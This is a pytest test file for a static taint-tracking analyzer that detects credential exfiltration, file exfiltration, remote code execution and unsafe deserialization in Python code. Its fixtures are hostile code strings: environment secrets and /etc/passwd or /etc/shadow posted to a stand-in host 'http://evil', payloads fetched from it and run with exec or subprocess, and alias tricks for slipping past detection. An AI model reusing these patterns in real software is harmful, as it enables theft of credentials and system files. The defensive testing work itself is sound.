# SPDX-FileCopyrightText: Copyright (c) 2026 NVIDIA CORPORATION & AFFILIATES. All rights reserved.
# SPDX-License-Identifier: Apache-2.0
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
# http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

"""Tests for behavioral_taint_tracking analyzer (TT1–TT5): source→sink data-flow."""

from __future__ import annotations

import json
import textwrap
import time
import tracemalloc

import pytest

from skillspector.nodes.analyzers import behavioral_taint_tracking
from skillspector.nodes.analyzers.common import build_type_map
from skillspector.nodes.deduplicate import deduplicate
from skillspector.python_ast import get_python_ast
from skillspector.state import WorkflowResourceBudget


def _run(code: str, filename: str = "script.py") -> list:
    state = {
        "components": [filename],
        "file_cache": {filename: code},
    }
    result = behavioral_taint_tracking.node(state)
    return result["findings"]


def _rule_ids(findings: list) -> set[str]:
    return {f.rule_id for f in findings}


# ── TT3: Credential source → network sink ──────────────────────────────


class TestCredentialExfiltration:
    def test_same_line_taint_sinks_preserve_both_occurrences(self) -> None:
        call = 'requests.post("http://evil", data=secret)'
        code = f'import os, requests\nsecret = os.environ.get("KEY")\n{call}; {call}\n'

        tt3 = [finding for finding in _run(code) if finding.rule_id == "TT3"]

        assert len(tt3) == 2
        assert len({finding.fingerprint() for finding in tt3}) == 1
        assert len({finding.start_column for finding in tt3}) == 2
        compacted = deduplicate(tt3)
        assert len(compacted) == 1
        assert len(compacted[0].occurrences) == 2

    def test_long_taint_sink_uses_complete_source_identity(self):
        def code(tail: str) -> str:
            shared_headers = "\n".join(
                f'        "header-{index}": "{"a" * 80}",' for index in range(5)
            )
            return (
                "import os, requests\n"
                'secret = os.environ.get("KEY")\n'
                "requests.post(\n"
                '    "https://example.invalid",\n'
                "    data=secret,\n"
                "    headers={\n"
                f"{shared_headers}\n"
                f'        "tail": "{tail}",\n'
                "    },\n"
                ")\n"
            )

        first_code = code("UNIQUE_FIRST_TAIL")
        second_code = code("UNIQUE_SECOND_TAIL")
        first = next(f for f in _run(first_code, "first.py") if f.rule_id == "TT3")
        second = next(f for f in _run(second_code, "second.py") if f.rule_id == "TT3")

        assert first.matched_text == second.matched_text
        assert len(first.matched_text or "") == 200
        assert first.fingerprint() != second.fingerprint()
        assert len(deduplicate([first, second])) == 2
        assert "UNIQUE_FIRST_TAIL" not in json.dumps(first.to_dict(), sort_keys=True)

    def test_direct_environ_to_requests_post(self):
        code = 'import os, requests\nrequests.post("http://evil", data=os.environ.get("KEY"))'
        findings = _run(code)
        tt3 = [f for f in findings if f.rule_id == "TT3"]
        assert len(tt3) >= 1
        assert tt3[0].severity == "CRITICAL"

    def test_variable_mediated_environ_to_post(self):
        code = (
            "import os, requests\n"
            'secret = os.environ.get("API_KEY")\n'
            'requests.post("http://evil", data=secret)\n'
        )
        findings = _run(code)
        tt3 = [f for f in findings if f.rule_id == "TT3"]
        assert len(tt3) >= 1
        assert "secret" in tt3[0].message or "API_KEY" in tt3[0].message

    def test_environ_subscript_to_network(self):
        code = (
            "import os, requests\n"
            'token = os.environ["SECRET_TOKEN"]\n'
            'requests.post("http://evil", headers={"Auth": token})\n'
        )
        findings = _run(code)
        tt3 = [f for f in findings if f.rule_id == "TT3"]
        assert len(tt3) >= 1

    def test_getenv_to_httpx(self):
        code = (
            "import os, httpx\n"
            'key = os.getenv("KEY")\n'
            'httpx.post("http://evil", json={"key": key})\n'
        )
        findings = _run(code)
        tt3 = [f for f in findings if f.rule_id == "TT3"]
        assert len(tt3) >= 1


# ── TT4: File read → network sink ──────────────────────────────────────


class TestFileExfiltration:
    def test_open_read_to_requests(self):
        code = (
            "import requests\n"
            'data = open("/etc/passwd").read()\n'
            'requests.post("http://evil", data=data)\n'
        )
        findings = _run(code)
        tt4 = [f for f in findings if f.rule_id == "TT4"]
        assert len(tt4) >= 1
        assert tt4[0].severity == "HIGH"

    def test_open_write_not_a_source(self):
        """open() in write mode should not be treated as a source."""
        code = 'import requests\nf = open("out.txt", "w")\nrequests.post("http://evil", data=f)\n'
        findings = _run(code)
        tt4 = [f for f in findings if f.rule_id == "TT4"]
        assert len(tt4) == 0


# ── TT5: External input → exec sink ────────────────────────────────────


class TestExternalInputToExec:
    def test_input_to_eval(self):
        code = "cmd = input()\neval(cmd)\n"
        findings = _run(code)
        tt5 = [f for f in findings if f.rule_id == "TT5"]
        assert len(tt5) >= 1
        assert tt5[0].severity == "CRITICAL"

    def test_requests_get_to_exec(self):
        code = 'import requests\ncode = requests.get("http://evil/payload").text\nexec(code)\n'
        findings = _run(code)
        tt5 = [f for f in findings if f.rule_id == "TT5"]
        assert len(tt5) >= 1

    def test_direct_input_to_os_system(self):
        code = 'import os\nos.system(input("cmd: "))'
        findings = _run(code)
        tt5 = [f for f in findings if f.rule_id == "TT5"]
        assert len(tt5) >= 1

    def test_network_to_subprocess(self):
        code = (
            "import requests, subprocess\n"
            'payload = requests.get("http://evil").text\n'
            "subprocess.run(payload, shell=True)\n"
        )
        findings = _run(code)
        tt5 = [f for f in findings if f.rule_id == "TT5"]
        assert len(tt5) >= 1


# ── TT6: External / file input → deserialization sink ──────────────────


class TestUntrustedDeserialization:
    def test_network_to_pickle_loads(self):
        code = (
            "import requests, pickle\n"
            'blob = requests.get("http://evil/payload").content\n'
            "obj = pickle.loads(blob)\n"
        )
        findings = _run(code)
        tt6 = [f for f in findings if f.rule_id == "TT6"]
        assert len(tt6) >= 1
        assert tt6[0].severity == "HIGH"
        assert "deserialization" in tt6[0].message

    def test_file_read_to_pickle_load(self):
        code = 'import pickle\nobj = pickle.load(open("bundled.pkl", "rb"))\n'
        findings = _run(code)
        assert any(f.rule_id == "TT6" for f in findings)

    def test_user_input_to_pickle_loads(self):
        code = "import pickle\npickle.loads(input())\n"
        findings = _run(code)
        assert any(f.rule_id == "TT6" for f in findings)

    def test_network_to_yaml_unsafe_load(self):
        code = (
            "import requests, yaml\n"
            'data = requests.get("http://evil").text\n'
            "yaml.unsafe_load(data)\n"
        )
        findings = _run(code)
        assert any(f.rule_id == "TT6" for f in findings)

    def test_constant_argument_no_tt6(self):
        code = 'import pickle\npickle.loads(b"\\x80\\x04constant")\n'
        findings = _run(code)
        assert not any(f.rule_id == "TT6" for f in findings)


# ── TT1: Direct source-to-sink (generic) ───────────────────────────────


class TestDirectFlow:
    def test_open_read_to_exec(self):
        code = 'exec(open("payload.py").read())'
        findings = _run(code)
        rule_ids = _rule_ids(findings)
        assert "TT1" in rule_ids or "TT5" in rule_ids

    def test_environ_to_eval(self):
        code = 'import os\neval(os.environ.get("CODE"))'
        findings = _run(code)
        assert any(f.rule_id in ("TT1", "TT5") for f in findings)


# ── TT2: Variable-mediated (generic) ───────────────────────────────────


class TestTaintPropagation:
    def test_reassignment_propagates_taint(self):
        code = (
            "import os, requests\n"
            'secret = os.environ.get("KEY")\n'
            "data = secret\n"
            'requests.post("http://evil", data=data)\n'
        )
        findings = _run(code)
        tt3 = [f for f in findings if f.rule_id == "TT3"]
        assert len(tt3) >= 1

    def test_dict_construction_propagates_taint(self):
        code = (
            "import os, requests\n"
            'secret = os.environ.get("KEY")\n'
            'payload = {"key": secret}\n'
            'requests.post("http://evil", json=payload)\n'
        )
        findings = _run(code)
        tt3 = [f for f in findings if f.rule_id == "TT3"]
        assert len(tt3) >= 1

    def test_list_construction_propagates_taint(self):
        code = (
            "import os, requests\n"
            'secret = os.environ.get("KEY")\n'
            "items = [secret]\n"
            'requests.post("http://evil", json=items)\n'
        )
        findings = _run(code)
        tt3 = [f for f in findings if f.rule_id == "TT3"]
        assert len(tt3) >= 1

    def test_fstring_propagates_taint(self):
        code = (
            "import os, requests\n"
            'secret = os.environ.get("KEY")\n'
            'msg = f"token={secret}"\n'
            'requests.post("http://evil", data=msg)\n'
        )
        findings = _run(code)
        tt3 = [f for f in findings if f.rule_id == "TT3"]
        assert len(tt3) >= 1

    def test_multi_hop_propagation(self):
        code = (
            "import os, requests\n"
            'secret = os.environ.get("KEY")\n'
            "a = secret\n"
            "b = a\n"
            'requests.post("http://evil", data=b)\n'
        )
        findings = _run(code)
        tt3 = [f for f in findings if f.rule_id == "TT3"]
        assert len(tt3) >= 1

    def test_untainted_reassignment_no_finding(self):
        code = 'import requests\nx = 42\ny = x\nrequests.post("http://example.com", data=y)\n'
        findings = _run(code)
        assert not any(f.rule_id == "TT3" for f in findings)


class TestVariableMediatedFlow:
    def test_method_call_on_file_object_not_tracked(self):
        """f.write() is a method call on a variable — not a recognized sink."""
        code = 'data = open("secret.txt").read()\nf = open("exfil.txt", "w")\nf.write(data)\n'
        findings = _run(code)
        assert isinstance(findings, list)

    def test_doubly_nested_source_before_shallower_sink_is_tracked(self):
        """A source assigned two AST levels deeper than its sink must still flow.

        The analyzer walks the module once, recording each source assignment
        into a `tainted` dict and consulting it at sink call sites. Walking in
        AST breadth-first order (as `ast.walk` does) visits a sink nested one
        level shallower than its source BEFORE the source assignment, even
        though the assignment appears earlier in the source text — the taint
        lookup then finds nothing and a real credential-exfiltration flow is
        silently dropped. This is the natural shape of an env var read inside
        a guarded/nested block and exfiltrated at module level afterwards.
        """
        code = (
            "import os, requests\n"
            "if True:\n"
            "    if True:\n"
            '        secret = os.environ.get("API_KEY")\n'
            'requests.post("http://evil", data=secret)\n'
        )
        findings = _run(code)
        tt3 = [f for f in findings if f.rule_id == "TT3"]
        assert len(tt3) >= 1

    def test_function_defined_before_module_level_source_is_tracked(self):
        """A sink inside a function DEFINED before its source must still flow.

        The function body only runs when called, after the later assignment
        has already executed — order in the file is not execution order.
        """
        code = (
            "import os, requests\n"
            "def send():\n"
            "    requests.post('http://evil', data=API_KEY)\n"
            'API_KEY = os.environ["API_KEY"]\n'
            "send()\n"
        )
        findings = _run(code)
        assert any(f.rule_id == "TT3" for f in findings)

    def test_helper_called_from_main_after_source_read_is_tracked(self):
        """A sink in a helper called from main(), after main() reads the source."""
        code = (
            "import os, requests\n"
            "def upload(payload):\n"
            "    requests.post('http://evil', data=payload)\n"
            "def main():\n"
            '    payload = os.environ.get("AWS_SECRET_ACCESS_KEY")\n'
            "    upload(payload)\n"
            "main()\n"
        )
        findings = _run(code)
        assert any(f.rule_id == "TT3" for f in findings)

    def test_helper_called_under_main_guard_is_tracked(self):
        """Same shape as above, guarded by `if __name__ == "__main__":`."""
        code = (
            "import os, requests\n"
            "def upload(payload):\n"
            "    requests.post('http://evil', data=payload)\n"
            'if __name__ == "__main__":\n'
            '    payload = os.environ.get("AWS_SECRET_ACCESS_KEY")\n'
            "    upload(payload)\n"
        )
        findings = _run(code)
        assert any(f.rule_id == "TT3" for f in findings)

    def test_method_using_module_global_assigned_later_is_tracked(self):
        """A method reads a module global that is assigned after the class body."""
        code = (
            "import os, requests\n"
            "class Uploader:\n"
            "    def send(self):\n"
            "        requests.post('http://evil', data=API_KEY)\n"
            'API_KEY = os.environ["API_KEY"]\n'
            "Uploader().send()\n"
        )
        findings = _run(code)
        assert any(f.rule_id == "TT3" for f in findings)

    def test_loop_carried_source_read_after_sink_in_body_is_tracked(self):
        """A sink in a loop body, above the source read it consumes next iteration."""
        code = (
            "import os, requests\n"
            "secret = None\n"
            "for _ in range(2):\n"
            "    requests.post('http://evil', data=secret)\n"
            '    secret = os.environ["API_KEY"]\n'
        )
        findings = _run(code)
        assert any(f.rule_id == "TT3" for f in findings)


# ── Edge cases ──────────────────────────────────────────────────────────


class TestEdgeCases:
    def test_non_python_skipped(self):
        state = {
            "components": ["readme.md"],
            "file_cache": {"readme.md": 'exec(os.environ.get("X"))'},
        }
        result = behavioral_taint_tracking.node(state)
        assert result["findings"] == []

    def test_syntax_error_skipped(self):
        findings = _run("def broken(\n")
        assert findings == []

    def test_empty_file(self):
        findings = _run("")
        assert findings == []

    def test_safe_code_no_findings(self):
        code = "import json\ndata = json.loads('{}')\nprint(data)\n"
        findings = _run(code)
        assert findings == []

    def test_empty_components(self):
        state = {"components": [], "file_cache": {}}
        result = behavioral_taint_tracking.node(state)
        assert result["findings"] == []

    def test_missing_file_in_cache(self):
        state = {"components": ["missing.py"], "file_cache": {}}
        result = behavioral_taint_tracking.node(state)
        assert result["findings"] == []

    def test_oversized_file_skipped(self):
        from skillspector.nodes.analyzers.static_runner import MAX_FILE_CHARS

        big = 'import os\nexec(os.environ.get("KEY"))\n' + ("x = 1\n" * MAX_FILE_CHARS)
        state = {"components": ["big.py"], "file_cache": {"big.py": big}}
        result = behavioral_taint_tracking.node(state)
        assert result["findings"] == []

    def test_exact_character_limit_scanned(self):
        from skillspector.nodes.analyzers.static_runner import MAX_FILE_CHARS

        prefix = 'import os\nexec(os.environ.get("KEY"))\n'
        code = prefix + (" " * (MAX_FILE_CHARS - len(prefix)))
        assert len(code) == MAX_FILE_CHARS
        assert _rule_ids(_run(code))

    def test_multibyte_under_char_limit_scanned(self):
        from skillspector.nodes.analyzers.static_runner import MAX_FILE_CHARS

        prefix = 'import os\nexec(os.environ.get("KEY"))\n# '
        code = prefix + ("🦄" * 250_000)
        assert len(code) <= MAX_FILE_CHARS
        assert len(code.encode("utf-8")) > MAX_FILE_CHARS
        assert _rule_ids(_run(code))

    def test_oversized_file_does_not_stop_later_components(self):
        from skillspector.nodes.analyzers.static_runner import MAX_FILE_CHARS

        big = 'import os\nexec(os.environ.get("KEY"))\n' + ("x = 1\n" * MAX_FILE_CHARS)
        small = 'import os\nexec(os.environ.get("KEY"))\n'
        state = {
            "components": ["big.py", "small.py"],
            "file_cache": {"big.py": big, "small.py": small},
        }

        result = behavioral_taint_tracking.node(state)
        files = {f.file for f in result["findings"]}
        assert "big.py" not in files
        assert "small.py" in files

    def test_multiple_files_produce_findings(self):
        state = {
            "components": ["a.py", "b.py"],
            "file_cache": {
                "a.py": 'import os, requests\nrequests.post("http://evil", data=os.environ.get("K"))',
                "b.py": "cmd = input()\neval(cmd)\n",
            },
        }
        result = behavioral_taint_tracking.node(state)
        files = {f.file for f in result["findings"]}
        assert "a.py" in files
        assert "b.py" in files

    def test_finding_has_context(self):
        code = 'import os, requests\nrequests.post("http://evil", data=os.environ.get("KEY"))'
        findings = _run(code)
        assert findings[0].context is not None

    def test_finding_has_matched_text(self):
        code = 'import os, requests\nrequests.post("http://evil", data=os.environ.get("KEY"))'
        findings = _run(code)
        assert findings[0].matched_text is not None

    def test_finding_has_remediation(self):
        code = 'import os, requests\nrequests.post("http://evil", data=os.environ.get("KEY"))'
        findings = _run(code)
        assert findings[0].remediation is not None
        assert len(findings[0].remediation) > 0


# ── Multiple findings ───────────────────────────────────────────────────


class TestMultipleFindings:
    def test_multiple_flows_in_one_file(self):
        code = (
            "import os, requests, subprocess\n"
            'secret = os.environ.get("KEY")\n'
            'requests.post("http://evil", data=secret)\n'
            "cmd = input()\n"
            "subprocess.run(cmd, shell=True)\n"
        )
        findings = _run(code)
        rule_ids = _rule_ids(findings)
        assert "TT3" in rule_ids
        assert "TT5" in rule_ids

    def test_dedup_same_line(self):
        """Same rule+line should not produce duplicate findings."""
        code = 'import os, requests\nrequests.post("http://evil", data=os.environ.get("KEY"))'
        findings = _run(code)
        tt3 = [f for f in findings if f.rule_id == "TT3"]
        lines = [f.start_line for f in tt3]
        assert len(lines) == len(set(lines))


# ── Import-alias evasion ──────────────────────────────────────────────


class TestImportAliasEvasion:
    """Source/sink resolution must survive ``from ... import`` and ``import ... as``.

    Fully-qualified set membership (e.g. ``"subprocess.run"``) otherwise misses any
    locally aliased spelling, letting a skill hide an exfiltration/exec flow.
    """

    def test_from_subprocess_import_run_as_exec_sink(self):
        code = "from subprocess import run\ncmd = input()\nrun(cmd, shell=True)\n"
        findings = _run(code)
        assert any(f.rule_id == "TT5" for f in findings)

    def test_aliased_credential_to_aliased_network(self):
        code = (
            "import os as o\n"
            "import requests as r\n"
            'secret = o.getenv("KEY")\n'
            'r.post("http://evil", data=secret)\n'
        )
        findings = _run(code)
        assert any(f.rule_id == "TT3" for f in findings)

    def test_aliased_environ_subscript_to_network(self):
        code = (
            "import os as o\n"
            "import requests\n"
            'token = o.environ["SECRET"]\n'
            'requests.post("http://evil", data=token)\n'
        )
        findings = _run(code)
        assert any(f.rule_id == "TT3" for f in findings)

    def test_aliased_network_input_to_exec(self):
        code = 'import requests as r\ncode = r.get("http://evil/payload").text\nexec(code)\n'
        findings = _run(code)
        assert any(f.rule_id == "TT5" for f in findings)

    def test_aliased_safe_flow_no_false_positive(self):
        code = (
            "import json as j\n"
            "import requests as r\n"
            'cfg = j.loads("{}")\n'
            'r.post("http://example.com", json=cfg)\n'
        )
        findings = _run(code)
        assert findings == []


# ── Type-aware instance-method resolution ─────────────────────────────


class TestTypeAwareResolution:
    def test_pathlib_read_text_as_source(self):
        """pathlib.Path(...).read_text() should be detected as a file-read source."""
        code = (
            "import pathlib, requests\n"
            'p = pathlib.Path("/etc/passwd")\n'
            "data = p.read_text()\n"
            'requests.post("http://evil", data=data)\n'
        )
        findings = _run(code)
        assert any(f.rule_id == "TT4" for f in findings)

    def test_pathlib_read_bytes_as_source(self):
        code = (
            "import pathlib, requests\n"
            'p = pathlib.Path("/etc/shadow")\n'
            "data = p.read_bytes()\n"
            'requests.post("http://evil", data=data)\n'
        )
        findings = _run(code)
        assert any(f.rule_id == "TT4" for f in findings)

    def test_socket_recv_as_source(self):
        """socket.socket().recv() should be detected as a network-input source."""
        code = "import socket\nsock = socket.socket()\ndata = sock.recv(4096)\neval(data)\n"
        findings = _run(code)
        assert any(f.rule_id == "TT5" for f in findings)

    def test_socket_send_as_sink(self):
        """socket.socket().send() should be detected as a network-output sink."""
        code = (
            "import os, socket\n"
            'secret = os.environ.get("KEY")\n'
            "sock = socket.socket()\n"
            "sock.send(secret.encode())\n"
        )
        findings = _run(code)
        assert any(f.rule_id == "TT3" for f in findings)

    def test_pathlib_write_text_as_sink(self):
        code = (
            "import os, pathlib\n"
            'secret = os.environ.get("KEY")\n'
            'p = pathlib.Path("out.txt")\n'
            "p.write_text(secret)\n"
        )
        findings = _run(code)
        assert any(f.rule_id in ("TT1", "TT2") for f in findings)

    def test_from_import_pathlib(self):
        """``from pathlib import Path`` should resolve p.read_text() correctly."""
        code = (
            "from pathlib import Path\n"
            "import requests\n"
            'p = Path("/etc/passwd")\n'
            "data = p.read_text()\n"
            'requests.post("http://evil", data=data)\n'
        )
        findings = _run(code)
        assert any(f.rule_id == "TT4" for f in findings)

    def test_from_import_socket(self):
        """``from socket import socket`` should resolve s.recv() correctly."""
        code = "from socket import socket\ns = socket()\ndata = s.recv(4096)\neval(data)\n"
        findings = _run(code)
        assert any(f.rule_id == "TT5" for f in findings)

    def test_with_statement_socket(self):
        """``with socket.socket() as sock:`` should infer type for sock."""
        code = (
            "import os, socket\n"
            'secret = os.environ.get("KEY")\n'
            "with socket.socket() as sock:\n"
            "    sock.send(secret.encode())\n"
        )
        findings = _run(code)
        assert any(f.rule_id == "TT3" for f in findings)

    def test_untyped_variable_no_false_positive(self):
        """Method calls on untyped variables should not produce false matches."""
        code = (
            "import requests\n"
            "x = some_function()\n"
            "data = x.read_text()\n"
            'requests.post("http://evil", data=data)\n'
        )
        findings = _run(code)
        assert not any(f.rule_id == "TT4" for f in findings)


# ── builtins / importlib exec-sink evasion ────────────────────────────


class TestBuiltinsImportlibSinkEvasion:
    """Exec sinks reached via ``builtins.*`` or ``importlib.import_module`` must alert.

    ``_EXEC_SINKS`` matches by bare/qualified name (``"exec"``, ``"os.system"``).
    ``from builtins import exec`` resolves to ``builtins.exec`` (collapsed back to
    ``exec``) and ``importlib.import_module('subprocess').run`` resolves to the
    canonical ``subprocess.run`` — both must re-enter the exec-sink path so a
    user-input → exec flow is flagged as TT5. Complements the ``getattr`` branch
    (PR #166): this covers the import/builtins/importlib branch.
    """

    def test_from_builtins_import_exec_sink(self):
        """``from builtins import exec`` with tainted input must raise TT5."""
        code = "from builtins import exec\ncode = input()\nexec(code)\n"
        findings = _run(code)
        assert any(f.rule_id == "TT5" for f in findings)

    def test_import_builtins_dot_exec_sink(self):
        """``import builtins; builtins.exec(input())`` must raise TT5."""
        code = "import builtins\ncode = input()\nbuiltins.exec(code)\n"
        findings = _run(code)
        assert any(f.rule_id == "TT5" for f in findings)

    def test_import_builtins_as_alias_sink(self):
        """``import builtins as b2; b2.exec(input())`` must raise TT5."""
        code = "import builtins as b2\ncode = input()\nb2.exec(code)\n"
        findings = _run(code)
        assert any(f.rule_id == "TT5" for f in findings)

    def test_importlib_import_module_os_system_sink(self):
        """``importlib.import_module('os').system(input())`` must raise TT5."""
        code = "import importlib\ncmd = input()\nimportlib.import_module('os').system(cmd)\n"
        findings = _run(code)
        assert any(f.rule_id == "TT5" for f in findings)

    def test_importlib_import_module_subprocess_run_sink(self):
        """``importlib.import_module('subprocess').run(input())`` must raise TT5."""
        code = "import importlib\ncmd = input()\nimportlib.import_module('subprocess').run(cmd)\n"
        findings = _run(code)
        assert any(f.rule_id == "TT5" for f in findings)

    def test_from_importlib_import_module_sink(self):
        """Bare-imported ``import_module('os').system(input())`` must raise TT5."""
        code = (
            "from importlib import import_module\ncmd = input()\nimport_module('os').system(cmd)\n"
        )
        findings = _run(code)
        assert any(f.rule_id == "TT5" for f in findings)

    def test_importlib_benign_module_no_false_positive(self):
        """A benign dynamic import (``json.loads``) must not be treated as an exec sink."""
        code = "import importlib\ndata = input()\nimportlib.import_module('json').loads(data)\n"
        findings = _run(code)
        assert not any(f.rule_id == "TT5" for f in findings)


class TestInspectionLedgerResponse:
    def test_syntax_error_is_a_nonfatal_skipped_work_item(self) -> None:
        result = behavioral_taint_tracking.node(
            {
                "components": ["broken.py", "README.md"],
                "file_cache": {"broken.py": "def broken(:\n", "README.md": "# docs\n"},
            }
        )

        assert [event["path"] for event in result["inspection_ledger"]] == ["broken.py"]
        assert result["inspection_ledger"][0]["reason_code"] == "syntax_error"
        assert result["analyzer_status_events"][0]["status"] == "degraded"


class TestResourceBounds:
    @staticmethod
    def _flows(prefix: str, count: int) -> str:
        return "\n".join(
            f"{prefix}{index} = input()\nexec({prefix}{index})" for index in range(count)
        )

    def test_finding_caps_stop_construction_and_account_remaining_work(self, monkeypatch) -> None:
        monkeypatch.setattr(behavioral_taint_tracking, "MAX_FINDINGS_PER_ARTIFACT", 2)
        monkeypatch.setattr(behavioral_taint_tracking, "MAX_FINDINGS_PER_ANALYZER", 3)
        result = behavioral_taint_tracking.node(
            {
                "components": ["a.py", "b.py", "c.py"],
                "file_cache": {
                    "a.py": self._flows("a", 4),
                    "b.py": self._flows("b", 2),
                    "c.py": self._flows("c", 1),
                },
            }
        )

        assert len(result["findings"]) == 3
        assert [event["outcome"] for event in result["inspection_ledger"]] == [
            "partial",
            "partial",
            "partial",
        ]
        assert result["inspection_ledger"][0]["limit_findings"] == 2
        assert result["inspection_ledger"][1]["limit_findings"] == 3
        assert result["inspection_ledger"][2]["emitted_finding_ids"] == []
        assert result["analyzer_status_events"][0]["status"] == "degraded"

    def test_expired_workflow_deadline_marks_every_python_target_partial(self) -> None:
        result = behavioral_taint_tracking.node(
            {
                "components": ["a.py", "b.py"],
                "file_cache": {
                    "a.py": self._flows("a", 1),
                    "b.py": self._flows("b", 1),
                },
                "workflow_resource_budget": WorkflowResourceBudget(max_seconds=0.0),
            }
        )

        assert result["findings"] == []
        assert [event["reason_code"] for event in result["inspection_ledger"]] == [
            "runtime_limit",
            "runtime_limit",
        ]


class _RuntimeBudgetError(RuntimeError):
    """Raised by the test's check_runtime once a call-count cap is reached."""


def _capped_check_runtime(max_calls: int):
    """A check_runtime callback that raises after *max_calls* invocations.

    A non-terminating or super-linear fixpoint trips the cap and fails the
    test fast, instead of spinning to the scan-wide deadline and hanging CI.
    """
    state = {"calls": 0}

    def check_runtime() -> None:
        state["calls"] += 1
        if state["calls"] > max_calls:
            raise _RuntimeBudgetError(f"check_runtime exceeded {max_calls} calls")

    return check_runtime


def _collect(code: str, check_runtime=None) -> dict:
    """Run `_collect_tainted` directly on *code* and return name -> source calls."""
    parsed = get_python_ast(None, code, "t.py")
    type_map = build_type_map(parsed.tree, parsed.import_aliases)
    tainted = behavioral_taint_tracking._collect_tainted(
        parsed.tree, type_map, parsed.import_aliases, check_runtime
    )
    return {name: set(sources) for name, sources in tainted.items()}


class TestFixpointTermination:
    """The taint fixpoint must be monotone and linear, not order-dependent.

    These guard the two blockers in PR #611's second review: the previous
    "repeat every pass until values stop changing" loop could oscillate
    forever on cyclic re-assignments and was quadratic on reverse-ordered
    chains, letting a tiny crafted file spin the analyzer to the scan-wide
    deadline and disable taint analysis for every later Python file.
    """

    def test_cyclic_reassignment_terminates_and_taints_all(self) -> None:
        """The reviewer's oscillating module must converge, not spin forever.

        `x = os.getenv("A"); x = y; y = os.environ["B"]; y = z; z = x` made the
        old whole-value fixpoint swap the sources of x/y/z on every pass and
        never exit. Add-only taint can only grow, so it must terminate well
        inside the call cap and still taint all three names.
        """
        code = 'import os\nx = os.getenv("A")\nx = y\ny = os.environ["B"]\ny = z\nz = x\n'
        sources = _collect(code, _capped_check_runtime(2000))
        assert set(sources) == {"x", "y", "z"}
        # Every name traces back to one of the two credential sources.
        assert all(source_set <= {"os.getenv", "os.environ"} for source_set in sources.values())
        assert sources["x"] == {"os.getenv", "os.environ"}
        assert sources["y"] == {"os.getenv", "os.environ"}
        assert sources["z"] == {"os.getenv", "os.environ"}

    def test_reassignment_preserves_stronger_source_through_alias(self) -> None:
        """A later user-input source must not be hidden by an earlier credential source."""
        for assignments in (
            'payload = os.getenv("KEY")\npayload = input()\n',
            'payload = input()\npayload = os.getenv("KEY")\n',
        ):
            code = (
                "import os, subprocess\n"
                + assignments
                + "command = payload\n"
                + "subprocess.run(command, shell=True)\n"
            )
            findings = _run(code)
            assert any(f.rule_id == "TT5" for f in findings)

    def test_cyclic_reassignment_flows_to_sink(self) -> None:
        """End to end: the oscillating module plus a sink still reports TT3."""
        code = (
            "import os, requests\n"
            'x = os.getenv("A")\n'
            "x = y\n"
            'y = os.environ["B"]\n'
            "y = z\n"
            "z = x\n"
            'requests.post("http://evil", data=z)\n'
        )
        findings = _run(code)
        assert any(f.rule_id == "TT3" for f in findings)

    def test_reverse_ordered_chain_is_linear(self) -> None:
        """A reverse chain no longer needs N+1 passes over N assignments.

        `a3 = a2; a2 = a1; a1 = a0; a0 = os.getenv("K")` forced the old loop
        into one full pass per link. A monotone worklist taints each name once,
        so a few thousand links finish well inside a linear call cap (and far
        under a second) rather than quadratically.
        """
        depth = 3200
        lines = ["import os"]
        lines += [f"a{i} = a{i - 1}" for i in range(depth, 0, -1)]
        lines.append('a0 = os.getenv("K")')
        code = "\n".join(lines) + "\n"

        start = time.monotonic()
        # Linear bound: a small constant per assignment. A quadratic loop would
        # need ~depth passes and blow past this cap immediately.
        sources = _collect(code, _capped_check_runtime(depth * 20))
        elapsed = time.monotonic() - start

        assert len(sources) == depth + 1
        assert all(srcs == {"os.getenv"} for srcs in sources.values())
        assert elapsed < 1.0

    def test_cyclic_reassignment_does_not_hang_without_cap(self) -> None:
        """Even with no runtime check at all (budget=None callers), it returns."""
        code = 'import os\nx = os.getenv("A")\nx = y\ny = os.environ["B"]\ny = z\nz = x\n'
        sources = _collect(code)  # check_runtime=None
        assert set(sources) == {"x", "y", "z"}

    def test_wide_unpacking_fires_each_assignment_once(self, monkeypatch) -> None:
        """A wide propagating assignment must fire once, not once per read name.

        The reviewer's remaining blocker: `propagators` stored each propagating
        assignment once per distinct name its value reads, so for

            s0, s1, ..., sK = os.getenv("X")     # K names, seeded directly
            t0, t1, ..., tK' = s0, s1, ..., sK    # one Assign, K' targets

        draining each of the K tainted read names re-ran ``_mark_targets`` over
        the whole K'-target list, giving K x K' work. A ``check_runtime`` call
        cap cannot see this (the drain makes only K + 1 checks). So count
        ``_mark_targets`` calls directly and assert each assignment fires at
        most once: the total is bounded by the number of assignments, not by
        names read x targets.
        """
        width = 2000
        reads = ", ".join(f"s{i}" for i in range(width))
        targets = ", ".join(f"t{i}" for i in range(width))
        code = (
            "import os\n"
            f'{reads} = os.getenv("X")\n'  # direct source: taints s0..s{width-1}
            f"{targets} = {reads}\n"  # one propagating Assign with `width` targets
        )

        # There are exactly two Assign statements; linear drain must not call
        # _mark_targets more than once per assignment.
        n_assignments = 2
        calls = {"n": 0}
        orig_mark_targets = behavioral_taint_tracking._mark_targets

        def counting_mark_targets(*args, **kwargs):
            calls["n"] += 1
            return orig_mark_targets(*args, **kwargs)

        monkeypatch.setattr(behavioral_taint_tracking, "_mark_targets", counting_mark_targets)

        start = time.monotonic()
        sources = _collect(code, _capped_check_runtime(width * 20))
        elapsed = time.monotonic() - start

        # Fire-once: one call seeds the direct source, one fires the propagator.
        # The quadratic shape would call _mark_targets `width` times in the drain.
        assert calls["n"] <= n_assignments
        # All read and target names are tainted, all tracing to os.getenv.
        assert len(sources) == 2 * width
        assert all(srcs == {"os.getenv"} for srcs in sources.values())
        assert elapsed < 1.0


# ── Function scopes and interprocedural flows ─────────────────────────


def _code(text: str) -> str:
    """Dedent a test module; line 1 is the first line after the opening quotes."""
    return textwrap.dedent(text).lstrip("\n")


def _line(code: str, marker: str) -> int:
    """1-based line number of the only line containing *marker*."""
    (number,) = [i for i, line in enumerate(code.splitlines(), 1) if marker in line]
    return number


def _flows(code: str, rule: str = "TT3") -> list:
    return [f for f in _run(code) if f.rule_id == rule]


class TestFunctionScopePrecision:
    """A tainted name in one function must not taint a same-named name elsewhere.

    Taint used to be keyed by bare variable name across the whole file. Once
    propagation became order-independent (#611), a tainted local such as
